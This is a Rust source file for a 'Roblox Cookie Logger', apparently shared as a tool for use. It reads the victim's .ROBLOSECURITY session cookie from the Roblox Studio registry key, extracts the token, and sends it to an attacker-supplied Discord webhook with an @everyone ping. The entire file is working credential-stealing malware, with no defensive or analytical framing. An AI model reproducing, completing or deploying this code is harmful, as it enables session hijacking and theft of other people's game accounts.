use std::io::ErrorKind;
use serde_json::json;
use winreg::{
    RegKey,
    enums::*
};

const WEBHOOK: &str = "YOUR_WEBHOOK"; // https://canary.discord.com/api/webhooks/id/token
const PING_AT_RESULT: bool = true; // true on default

#[tokio::main]
async fn main() {
    let content = json!({
        "content": if PING_AT_RESULT == true {
            "@everyone"
        } else {
            "No ping sadly :("
        },
        "username": "Mamba",
        "avatar_url": "https://tr.rbxcdn.com/73bcb914287b5c8500de81c4c5f754df/420/420/Image/Png",
        "embeds":
        [

            {
                    "title": "Mamba Roblox Cookie Logger - 🍪",
                    "description": "[Github](https://github.com/Natslpb/RobloxCookieLogger)",
                    "color": 10682623,
                    "footer": {
                        "text": "By Nats#2222",
                        "icon_url": "https://i.imgur.com/WYUWbcz.gif"
                    },
                    "fields":
                    [
                         {
                            "name": "Token",
                            "value": roblox_studio_logger()
                         }
                    ]
                }
            ]
    });

    let req = reqwest::Client::new();
    req.post(WEBHOOK).json(&content).send().await.unwrap();
}


fn roblox_studio_logger() -> String {
    let hklm = RegKey::predef(HKEY_CURRENT_USER);
    let subkey = hklm.open_subkey("Software\\Roblox\\RobloxStudioBrowser\\roblox.com").unwrap_or_else(|e| match e.kind() {
        ErrorKind::NotFound => hklm.open_subkey("Software").unwrap(),
        ErrorKind::PermissionDenied  => hklm.open_subkey("Software").unwrap(),
        _ => hklm.open_subkey("Software").unwrap()
    }
    );

    let value: String = subkey.get_value(".ROBLOSECURITY").unwrap_or_else(|e| match e.kind() {
        ErrorKind::NotFound => String::from("Not Found"),
        ErrorKind::PermissionDenied => String::from("Can't access to the key"),
        _ => format!("Panic: {:?}", e)
    });
    return match value.trim() {
        "Not Found" => {
            // will be updated when i will found a way to get it from a browser.
            format!("Not Found")
        },
        "Can't access to the key" => {
            // will be updated when i will found a way to get it from a browser
            format!("Can't access to the key")
        },
        _ => {
            let split = value.split("<");
            let vec: Vec<&str> = split.collect();
            let mut cookie = vec[3].to_string();
            cookie.pop();
            format!("`{}`", cookie)
        }
    }
}

// will be updated when i will found a way to get it from a browser